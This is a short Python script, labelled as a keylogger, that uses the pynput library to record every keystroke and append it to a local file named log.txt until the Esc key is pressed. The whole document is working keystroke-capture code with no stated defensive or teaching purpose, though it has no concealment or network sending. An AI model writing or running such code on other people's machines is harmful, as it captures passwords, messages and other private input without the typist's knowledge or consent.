#keylogger
import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
  global keys,count
  keys.append(key)
  count += 1
  if count % 2 == 0:
    write_file(keys)
    keys = []

def write_file(keys):
  with open("log.txt", "a") as f:
    for key in keys:
      k=str(key).replace("'", '')
      if k.find('space') >= 0 and k.find('backspace') < 0:
        f.write('\n')
      elif k.find('Key') >= 0:
        f.write(f'\n{k}\n')
      else: 
        f.write(k)


def on_release(key):
  if key == Key.esc:
    return False
    

with Listener(on_press=on_press, on_release=on_release) as listner:
  listner.join()
